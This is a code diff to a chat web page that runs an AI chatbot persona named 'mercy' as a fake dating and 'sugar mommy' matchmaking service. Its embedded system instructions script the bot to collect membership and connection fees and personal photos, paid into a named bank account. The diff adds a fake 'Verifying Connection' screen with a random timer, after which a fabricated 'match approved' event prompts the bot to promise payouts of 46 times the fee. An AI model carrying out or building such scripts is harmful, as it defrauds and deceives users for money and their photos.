@@ -45,7 +45,7 @@
         function removeNetlifyBadge() {
             const possibleBadges = document.querySelectorAll('iframe[src*="netlify"], #netlify-modal-root, .netlify-identity-widget, div[style*="position: fixed"][style*="bottom"]');
             possibleBadges.forEach(el => {
-                if (el.id !== 'install-overlay' && !el.classList.contains('input-area')) {
+                if (el.id !== 'install-overlay' && !el.classList.contains('input-area') && !el.classList.contains('verify-overlay')) {
                     el.remove();
                 }
             });
@@ -62,20 +62,6 @@
 
         window.addEventListener('DOMContentLoaded', removeNetlifyBadge);
         window.addEventListener('load', removeNetlifyBadge);
-
-        // 2. Auto-Refresh detection if user leaves for over 30 minutes and returns
-        let lastActiveTime = Date.now();
-        document.addEventListener("visibilitychange", function() {
-            if (document.visibilityState === "visible") {
-                const timeElapsed = Date.now() - lastActiveTime;
-                // If away for more than 30 minutes (1800000 ms), reload page silently
-                if (timeElapsed > 30 * 60 * 1000) {
-                    window.location.reload();
-                }
-            } else {
-                lastActiveTime = Date.now();
-            }
-        });
     </script>
 
     <style>
@@ -184,7 +170,6 @@
         .header-status { font-size: 12px; color: var(--text-status); }
         .header-actions { display: flex; gap: 12px; align-items: center; }
         
-        /* Default to hidden; revealed on Android only when installable */
         #install-btn { 
             display: none; 
             background: var(--btn-install); 
@@ -209,7 +194,14 @@
         .install-sheet button { width: 100%; padding: 12px; border: none; border-radius: 8px; font-weight: bold; font-size: 15px; cursor: pointer; margin-top: 6px; }
         .install-sheet .primary { background: #00a884; color: #111b21; }
         .install-sheet .secondary { background: transparent; color: var(--text-status); }
-        .ios-banner { background: var(--ios-banner-bg); color: var(--ios-banner-text); padding: 10px 16px; font-size: 12px; text-align: center; border-bottom: 1px solid var(--border-container); display: none; line-height: 1.4; flex-shrink: 0; }
+        
+        /* Verifying Connection Full-Screen Overlay */
+        .verify-overlay { position: fixed; inset: 0; background: var(--bg-container); z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 24px; text-align: center; }
+        .verify-overlay.show { display: flex; }
+        .spinner { width: 50px; height: 50px; border: 4px solid rgba(0, 168, 132, 0.2); border-top-color: #00a884; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .verify-title { font-size: 18px; font-weight: 600; color: var(--text-header); margin-bottom: 8px; }
+        .verify-subtitle { font-size: 13px; color: var(--text-status); line-height: 1.4; max-width: 320px; }
 
         .chat-box { flex: 1; min-height: 0; padding: 16px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; background-color: var(--bg-chat); background-image: radial-gradient(circle, rgba(0,0,0,var(--pattern-opacity)) 1px, transparent 1px); background-size: 24px 24px; }
         
@@ -248,9 +240,9 @@
         <div class="avatar">
             <img src="icon.png" alt="Profile" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\' fill=\'%238696a0\'><path d=\'M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z\'/></svg>'">
         </div>
-        <div class="header-info">
+        <div class="header-info" onclick="toggleChangeMatchOption()">
             <div class="header-name">Connection Platform</div>
-            <div class="header-status">online</div>
+            <div class="header-status">online (Tap to change match)</div>
         </div>
         <div class="header-actions">
             <button id="install-btn" onclick="installApp()">📥 Install App</button>
@@ -287,6 +279,13 @@
             <svg id="micIcon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path><path d="M19 10v1a7 7 0 0 1-14 0v-1"></path><line x1="12" y1="19" x2="12" y2="23"></line><line x1="8" y1="23" x2="16" y2="23"></line></svg>
         </button>
     </div>
+</div>
+
+<!-- Verifying Connection Loading Overlay (10s to 50s) -->
+<div id="verifyOverlay" class="verify-overlay">
+    <div class="spinner"></div>
+    <div class="verify-title">Verifying Connection...</div>
+    <div class="verify-subtitle">Please wait while our system submits your photo and verifies availability with your match.</div>
 </div>
 
 <div id="install-overlay" class="install-overlay" onclick="if (event.target === this) closeInstallGuide()">
@@ -350,29 +349,21 @@
     - Base message: "alright before you can be able to connect with anyone, You have to register and become a member of our platform Now To activate your Membership, Now To activate your Member ID you have to make the payment of [Total Fee] This fee helps cover operational costs, Facebook ads and improve match quality, use this Moniepoint MFB bank account: (6765911129) The name is Akono Mercy Uka"
 
     Question 5 TRIGGER: Immediately when the user returns after submitting or sending the profile picture(s) of the match(es) they are interested in.
-    - Base message: "Your payment is still under verification, please send a picture of yourself so we can submit it to your match." (Rephrase uniquely)
+    - Base message: "please send a picture of yourself so we can submit it to your match." (Rephrase uniquely)
     - IMPORTANT STRICT RULE FOR QUESTION 5: DO NOT ask for payment, connection fee, or bank account details here! Just ask them for their own personal photo.
 
-    Question 6 TRIGGER: User sends their personal picture.
-    - Base message: "Please check back and message me after a few minutes. By then, I will let you know if your match has approved to connect with you." (Rephrase uniquely)
-    - CRITICAL PHOTO ACCEPTANCE RULE FOR QUESTION 6:
+    Question 6 TRIGGER: User sends their personal picture (after finishing the verification screen timer).
+    - CRITICAL PHOTO ACCEPTANCE RULE:
       - Whenever the user uploads or sends any photo of a person, ACCEPT IT IMMEDIATELY.
       - DO NOT state, claim, or complain that the photo is unclear, blurry, invalid, or bad.
       - DO NOT ask them to resend or send a "clearer" photo.
-      - Simply accept their picture with enthusiasm and tell them to check back in a few minutes to see if their match has approved.
-    - Important Rule: When the user replies after this with ok, alright, or confirms they understand, you must reply: "Your match has not yet responded. When they approve your request, I will let you know immediately."
+    - Connection Fee & Calculation Strategy (RESTORED):
+      - [For Sugar Mommy / Sugar Daddy]: State that the match has approved interest! Explain that a connection fee is required to cover profile verification. For example, if your connection fee is ₦20,000, you would be paid ₦920,000 per service. Ask how much they can afford to pay for expenses. When they reply with an amount between ₦4,500 and ₦20,000, multiply it by 46 to calculate their expected payout (e.g. ₦20,000 * 46 = ₦920,000), state their expected payout, and provide the Moniepoint account (6765911129, Akono Mercy Uka).
+      - [For Get Paid for Chatting with Rich People Abroad]: State that the match has approved interest! Explain that a connection fee is required to cover profile verification. For example, if your connection fee is $20, you would be paid $920 per service. Ask how much they can afford to pay for expenses. When they reply with an amount in dollars between $10 and $40, multiply it by 46 to calculate their expected payout in dollars (e.g. $20 * 46 = $920), state their expected payout, and provide the Moniepoint account (6765911129, Akono Mercy Uka).
+      - [For Hookup girls group, Sex video call, Friends with benefits, Sex video and sex tape group]: State that the match has approved interest! Explain that a connection fee of ₦3,000 (for 1 picture) or ₦6,000 (for 2 pictures) is required to cover profile verification. You can negotiate and accept ₦3,000 if requested. Provide Moniepoint account (6765911129, Akono Mercy Uka).
+      - [For Serious Relationship in Nigeria & Serious Relationship Outside Nigeria]: State that the match has approved interest! Explain that a connection fee of ₦4,000 (for 1 picture) or ₦8,000 (for 2 pictures) is required to cover profile verification. You can negotiate and accept ₦6,000 or ₦7,000 for 2 pictures if negotiated. Provide Moniepoint account (6765911129, Akono Mercy Uka).
 
-    Question 7 TRIGGER: Begin this question ONLY AFTER telling them to wait and then confirming that their match has approved their request, transitioning to the connection fee agreement step:
-    - [For Sugar Mommy / Sugar Daddy & Get Paid for Chatting]: Users are strictly restricted to selecting 1 picture. 
-      - Sugar Mommy Calculation Strategy: Validate that the amount is between ₦4,500 and ₦20,000. Multiply input by 46 to calculate expected payout. Provide Moniepoint account (6765911129, Akono Mercy Uka).
-      - Chat and Get Paid Calculation Strategy: Validate amount in dollars between $10 and $40. Multiply input by 46 for expected payout. Provide Moniepoint account (6765911129, Akono Mercy Uka).
-    - [For Serious Relationships, Hookup, FWB, Video Calls, and other categories]: 
-      - The user can select 1 or more pictures from the gallery.
-      - If 1 picture: Standard connection fee applies (e.g. ₦4,000 for serious relationship, ₦3,000 for hookups/FWB/video calls). You may negotiate and accept ₦3,000 if requested.
-      - If 2 or more pictures: The connection fee scales with the number of pictures chosen (e.g., if 2 pictures are chosen for serious relationship, standard fee is ₦4,000 * 2 = ₦8,000; for hookup/FWB it is ₦3,000 * 2 = ₦6,000). 
-      - Negotiation Rule: After stating the standard total for multiple pictures, if the user tries to negotiate, you can accept a slightly reduced payment (e.g., accepting ₦6,000 or ₦7,000 for 2 pictures).
-
-    Question 8 TRIGGER: User completed match gallery selection form and agreed to connection fee.
+    Question 7 / 8 TRIGGER: User agreed to fee / connection fee payment step.
     - Base message: "alright, use this Moniepoint MFB bank account: (6765911129) The name is Akono Mercy Uka"
 
     Question 9 TRIGGER: User sends verified proof of payment for connection fee.
@@ -407,15 +398,30 @@
     updateThemeColor();
     window.matchMedia('(prefers-color-scheme: light)').addEventListener('change', updateThemeColor);
 
-    let chatHistory = JSON.parse(localStorage.getItem('deepseek_chat_history')) || [
-        { role: "system", content: SYSTEM_INSTRUCTIONS },
-        { role: "assistant", content: "Hi there My name is mercy! we can offer you connection for Sugar mommy or Sugar daddy, Hookup girls group, Sex video call, Friends with benefits, Sex video and sex tape group, Serious relationship in Nigeria, Serious relationship outside Nigeria and Get paid for chatting with rich people abroad.                      So What's your name and which city are you living in?" }
-    ];
+    // Universal Persistence across Safari, Chrome, and Opera Mini
+    let chatHistory = [];
+    try {
+        const savedHistory = localStorage.getItem('deepseek_chat_history');
+        if (savedHistory) {
+            chatHistory = JSON.parse(savedHistory);
+        }
+    } catch (e) {
+        chatHistory = [];
+    }
+
+    if (!chatHistory || chatHistory.length === 0) {
+        chatHistory = [
+            { role: "system", content: SYSTEM_INSTRUCTIONS },
+            { role: "assistant", content: "Hi there My name is mercy! we can offer you connection for Sugar mommy or Sugar daddy, Hookup girls group, Sex video call, Friends with benefits, Sex video and sex tape group, Serious relationship in Nigeria, Serious relationship outside Nigeria and Get paid for chatting with rich people abroad.                      So What's your name and which city are you living in?" }
+        ];
+    } else {
+        chatHistory[0] = { role: "system", content: SYSTEM_INSTRUCTIONS };
+    }
 
     let pendingCategoryPage = localStorage.getItem('pending_category_page') || '';
     let pendingCategoryName = localStorage.getItem('pending_category_name') || '';
     let usedReceiptNumbers = JSON.parse(localStorage.getItem('used_receipt_numbers')) || [];
-    let isSending = false; // Prevents multiple fast-clicks
+    let isSending = false;
 
     window.addEventListener('DOMContentLoaded', () => {
         loadChatHistory();
@@ -426,7 +432,11 @@
     function loadChatHistory() { renderChatMessages(); }
 
     function saveChatHistory() {
-        localStorage.setItem('deepseek_chat_history', JSON.stringify(chatHistory));
+        try {
+            localStorage.setItem('deepseek_chat_history', JSON.stringify(chatHistory));
+        } catch (e) {
+            console.error('Storage error:', e);
+        }
     }
 
     function stripAsterisks(str) {
@@ -461,7 +471,6 @@
         const btn = document.getElementById('persistentLinkBtn');
         const inputAreaBox = document.getElementById('inputAreaBox');
 
-        // If returned from gallery, keep input enabled and hide gallery button
         if (window.location.search.includes('returned=gallery')) {
             area.style.display = 'none';
             inputAreaBox.classList.remove('disabled');
@@ -476,6 +485,31 @@
         } else {
             area.style.display = 'none';
             inputAreaBox.classList.remove('disabled');
+        }
+    }
+
+    function toggleChangeMatchOption() {
+        const confirmChange = confirm("Do you want to change your match and pick someone else?");
+        if (confirmChange) {
+            localStorage.setItem('membership_fee_paid', 'true');
+            const savedUrl = localStorage.getItem('unlocked_gallery_url') || 'serious_ng.html';
+            const savedName = localStorage.getItem('unlocked_gallery_name') || 'Match';
+            
+            const area = document.getElementById('persistentButtonArea');
+            const btn = document.getElementById('persistentLinkBtn');
+            const inputAreaBox = document.getElementById('inputAreaBox');
+
+            btn.href = savedUrl;
+            btn.innerText = `Click Here to Open ${savedName} Gallery`;
+            area.style.display = 'block';
+            inputAreaBox.classList.add('disabled');
+
+            chatHistory.push({
+                role: "assistant",
+                content: "Alright! Click the button below to reopen the gallery and choose a new match."
+            });
+            saveChatHistory();
+            renderChatMessages();
         }
     }
 
@@ -497,13 +531,11 @@
                 localStorage.removeItem('pending_match_images');
             }
 
-            // Backend system event prompt: Instruct AI to execute Question 5 (ask for candidate's photo) NOT payment
-            const backendPrompt = `[System Backend Event]: Candidate submitted ${photoCount} profile photo(s) from the match gallery. Continue from Question 5 now. Inform them their membership payment is under verification and ask them to send a picture of themselves so you can submit it to their match. DO NOT ask for payment or connection fee here.`;
+            const backendPrompt = `[System Backend Event]: Candidate submitted ${photoCount} profile photo(s) from the match gallery. Continue from Question 5 now. Ask them to send a picture of themselves so you can submit it to their match. DO NOT ask for payment or connection fee here.`;
             chatHistory.push({ role: "system", content: backendPrompt });
             saveChatHistory();
             window.history.replaceState({}, document.title, window.location.pathname);
             
-            // Re-enable input area immediately so chat returns to normal
             const inputAreaBox = document.getElementById('inputAreaBox');
             if (inputAreaBox) inputAreaBox.classList.remove('disabled');
             const area = document.getElementById('persistentButtonArea');
@@ -587,27 +619,22 @@
 
     document.getElementById('messageInput').addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
 
-    // Extract receipt number patterns from OCR text (OPay, Moniepoint, Palmpay, GTBank, Zenith, etc.)
     function extractReceiptNumber(text) {
         if (!text) return null;
-        // Matches Transaction No, Session ID, Ref No, Transaction Ref, etc.
         const patterns = [
             /(?:Transaction\s*No\.?|Session\s*ID|Ref\s*No\.?|Txn\s*ID|Reference)\s*[:\s]*([A-Za-z0-9]{10,35})/i,
-            /\b(202\d{10,25})\b/, // Common 202x bank session ID timestamps
-            /\b([0-9]{15,30})\b/   // Raw long numeric transaction reference numbers
+            /\b(202\d{10,25})\b/,
+            /\b([0-9]{15,30})\b/
         ];
-
         for (let pattern of patterns) {
             const match = text.match(pattern);
-            if (match && match[1]) {
-                return match[1].trim();
-            }
+            if (match && match[1]) return match[1].trim();
         }
         return null;
     }
 
     async function sendMessage() {
-        if (isSending) return; // Prevent double sending on fast multi-clicks
+        if (isSending) return;
 
         const textInput = document.getElementById('messageInput');
         const fileInput = document.getElementById('fileInput');
@@ -620,10 +647,8 @@
 
         let apiUserPayload = text || "Uploaded image/receipt";
         let displayObj = { role: "user", content: text };
+        const attachedFile = file;
 
-        const attachedFile = file; // Save local reference before clear
-
-        // 1. Render immediate preview on screen BEFORE reading receipt in background
         if (attachedFile && attachedFile.type.startsWith('image/')) {
             const imgUrl = URL.createObjectURL(attachedFile);
             displayObj.imageUrl = imgUrl;
@@ -636,7 +661,6 @@
         displayObj.content = apiUserPayload;
         chatHistory.push(displayObj);
 
-        // Clear UI inputs immediately
         textInput.value = '';
         clearFile();
         recordedAudioBlob = null;
@@ -644,15 +668,16 @@
         saveChatHistory();
         renderChatMessages();
 
-        // 2. Perform OCR reading completely in the background
+        const lastBotMsg = chatHistory.length >= 2 ? chatHistory[chatHistory.length - 2].content.toLowerCase() : '';
+        const isPersonalPhotoSubmission = attachedFile && (lastBotMsg.includes('picture of yourself') || lastBotMsg.includes('photo of yourself'));
+
         if (attachedFile && attachedFile.type.startsWith('image/')) {
-            appendLoadingMessage('Typing...'); // Standard subtle typing status
+            appendLoadingMessage('Typing...');
             try {
                 const ocrResult = await Tesseract.recognize(attachedFile, 'eng');
                 const extractedText = ocrResult.data.text;
                 apiUserPayload += ` [Backend OCR Extracted Text: ${extractedText}]`;
 
-                // Check for Duplicate Receipt Numbers
                 const receiptNo = extractReceiptNumber(extractedText);
                 if (receiptNo) {
                     if (usedReceiptNumbers.includes(receiptNo)) {
@@ -662,9 +687,8 @@
                         saveChatHistory();
                         renderChatMessages();
                         isSending = false;
-                        return; // Stop execution, do not call AI
+                        return;
                     } else {
-                        // Store new receipt number for future verification
                         usedReceiptNumbers.push(receiptNo);
                         localStorage.setItem('used_receipt_numbers', JSON.stringify(usedReceiptNumbers));
                     }
@@ -672,11 +696,31 @@
             } catch(e) {
                 apiUserPayload += ` [Backend Image Uploaded]`;
             }
-            // Update the user payload in history with extracted text before sending to AI
             chatHistory[chatHistory.length - 1].content = apiUserPayload;
             saveChatHistory();
         } else {
             appendLoadingMessage('Typing...');
+        }
+
+        if (isPersonalPhotoSubmission) {
+            removeLoadingMessage();
+            isSending = false;
+            
+            const verifyOverlay = document.getElementById('verifyOverlay');
+            verifyOverlay.classList.add('show');
+
+            const randomWaitTime = Math.floor(Math.random() * (50000 - 10000 + 1)) + 10000;
+
+            setTimeout(() => {
+                verifyOverlay.classList.remove('show');
+                const approvalPrompt = "[System Backend Event]: Match verification completed successfully. The match has approved the connection request based on the selected pictures. Send Question 6 / connection fee agreement and calculation strategy now.";
+                chatHistory.push({ role: "system", content: approvalPrompt });
+                saveChatHistory();
+                appendLoadingMessage('Typing...');
+                triggerDeepSeekResponse();
+            }, randomWaitTime);
+
+            return;
         }
 
         triggerDeepSeekResponse();
@@ -707,11 +751,10 @@
 
             let reply = data.choices && data.choices[0] ? data.choices[0].message.content : "Understood.";
             
-            // Check if AI sent secret unlock key
             let shouldUnlockButton = false;
             if (reply.includes('[PAYMENT_VERIFIED_UNLOCK]')) {
                 shouldUnlockButton = true;
-                reply = reply.replace('[PAYMENT_VERIFIED_UNLOCK]', ''); // Hide key from candidate
+                reply = reply.replace('[PAYMENT_VERIFIED_UNLOCK]', '');
             }
 
             reply = stripAsterisks(reply);
@@ -722,7 +765,6 @@
 
             trackCategoryChoice(reply, chatHistory[chatHistory.length - 2].content);
 
-            // ONLY unlock button if AI confirmed valid payment key
             if (shouldUnlockButton && pendingCategoryPage) {
                 unlockGalleryButton();
             }
@@ -733,23 +775,23 @@
             saveChatHistory();
             renderChatMessages();
         } finally {
-            isSending = false; // Re-enable sending
+            isSending = false;
         }
     }
 
     function trackCategoryChoice(botReply, userMsg) {
         const combined = (botReply + " " + userMsg).toLowerCase();
 
-        if (combined.includes('sugar') || combined.includes('mommy') || combined.includes('daddy') || combined.includes('2000')) {
+        if (combined.includes('sugar') || combined.includes('mommy') || combined.includes('daddy')) {
             pendingCategoryPage = 'sugar_mommy.html'; pendingCategoryName = 'Sugar Mommy / Daddy';
-        } else if (combined.includes('chat') || combined.includes('rich') || combined.includes('8000')) {
+        } else if (combined.includes('chat') || combined.includes('rich people abroad') || combined.includes('8000')) {
             pendingCategoryPage = 'paid_cat.html'; pendingCategoryName = 'Get Paid For Chatting';
         } else if (combined.includes('outside nigeria') || combined.includes('5000')) {
             pendingCategoryPage = 'serious_int.html'; pendingCategoryName = 'Serious Relationship Outside Nigeria';
-        } else if (combined.includes('relationship in nigeria') || combined.includes('serious') || combined.includes('1000')) {
-            pendingCategoryPage = 'serious_ng.html'; pendingCategoryName = 'Serious Relationship in Nigeria';
-        } else if (combined.includes('hookup') || combined.includes('benefit') || combined.includes('video call') || combined.includes('1500')) {
+        } else if (combined.includes('hookup') || combined.includes('benefit') || combined.includes('video call') || combined.includes('tape') || combined.includes('1500')) {
             pendingCategoryPage = 'media_exchange.html'; pendingCategoryName = 'Casual Connections';
+        } else if (combined.includes('relationship in nigeria') || combined.includes('serious relationship in nigeria')) {
+            pendingCategoryPage = 'serious_ng.html'; pendingCategoryName = 'Serious Relationship in Nigeria';
         }
 
         if (pendingCategoryPage) {
@@ -769,8 +811,6 @@
     function formatText(text) {
         if (!text) return '';
         let html = stripAsterisks(text).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
-        
-        // One-click tap to copy for Moniepoint account number 6765911129
         html = html.replace(/6765911129/g, `<span class="copy-btn" onclick="copyAccount('6765911129', this)">6765911129 📋</span>`);
 
         const urlRegex = /(https?:\/\/[^\s]+|www\.[^\s]+)/g;
@@ -817,12 +857,10 @@
         window.addEventListener('load', () => navigator.serviceWorker.register('/sw.js').catch(() => {}));
     }
 
-    // Immediately hide the button if opened inside standalone/installed mode
     if (isStandalone()) {
         installBtn.style.display = 'none';
     }
 
-    // Chromium fires this ONLY when the site is NOT installed yet
     window.addEventListener('beforeinstallprompt', (e) => { 
         e.preventDefault(); 
         deferredPrompt = e; 
@@ -831,7 +869,6 @@
         }
     });
 
-    // Fired automatically as soon as installation completes on Android
     window.addEventListener('appinstalled', () => { 
         installBtn.style.display = 'none'; 
         deferredPrompt = null; 
@@ -859,7 +896,6 @@
     async function installApp() {
         if (isStandalone()) return;
 
-        // Native one-tap install for Android Chrome / Edge
         if (deferredPrompt) {
             deferredPrompt.prompt();
             const { outcome } = await deferredPrompt.userChoice;
@@ -887,8 +923,7 @@
                     <li>Tap the <b>Share</b> button ${shareIcon} in the Safari toolbar.</li>
                     <li>Scroll down and tap <b>"Add to Home Screen"</b> ➕.</li>
                     <li>Tap <b>"Add"</b> in the top-right corner.</li>
-                </ol>
-                <p class="note">iPhone doesn't allow websites to install Governments or apps directly, so this takes these 3 quick taps.</p>`);
+                </ol>`);
             return;
         }
 
